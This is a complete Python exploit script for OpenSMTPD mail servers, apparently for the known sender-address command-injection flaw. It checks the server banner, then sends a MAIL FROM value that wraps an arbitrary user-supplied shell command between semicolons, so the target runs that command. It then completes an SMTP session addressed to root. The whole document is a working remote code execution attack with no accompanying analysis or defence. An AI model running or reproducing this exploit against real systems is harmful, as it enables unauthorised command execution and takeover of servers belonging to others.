#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print('Usage {} <target ip> <target port> <command>'.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 'touch /tmp/x'".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
print('[DEBUG] Received after connect: {}'.format(res))
if 'OpenSMTPD' not in str(res):
    print('[!] No OpenSMTPD detected')
    print('[!] Received {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] OpenSMTPD detected')
s.send(b'HELO x\r\n')
print('[DEBUG] Sent: HELO x\\r\\n')
res = s.recv(1024)
print('[DEBUG] Received after HELO: {}'.format(res))
if '250' not in str(res):
    print('[!] Error connecting, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Connected, sending payload')
payload = 'MAIL FROM:<;{};>\r\n'.format(CMD)
s.send(bytes(payload, 'utf-8'))
print('[DEBUG] Sent: {}'.format(payload.strip()))
res = s.recv(1024)
print('[DEBUG] Received after MAIL FROM: {}'.format(res))
if '250' not in str(res):
    print('[!] Error sending payload, expected 250')
    print('[!] Received: {}'.format(str(res)))
    print('[!] Exiting...')
    sys.exit(1)

print('[*] Payload sent')
s.send(b'RCPT TO:<root>\r\n')
print('[DEBUG] Sent: RCPT TO:<root>\\r\\n')
res = s.recv(1024)
print('[DEBUG] Received after RCPT TO: {}'.format(res))
s.send(b'DATA\r\n')
print('[DEBUG] Sent: DATA\\r\\n')
res = s.recv(1024)
print('[DEBUG] Received after DATA: {}'.format(res))
s.send(b'\r\nxxx\r\n.\r\n')
print('[DEBUG] Sent: \\r\\nxxx\\r\\n.\\r\\n')
res = s.recv(1024)
print('[DEBUG] Received after sending data: {}'.format(res))
s.send(b'QUIT\r\n')
print('[DEBUG] Sent: QUIT\\r\\n')
res = s.recv(1024)
print('[DEBUG] Received after QUIT: {}'.format(res))
print('[*] Done')
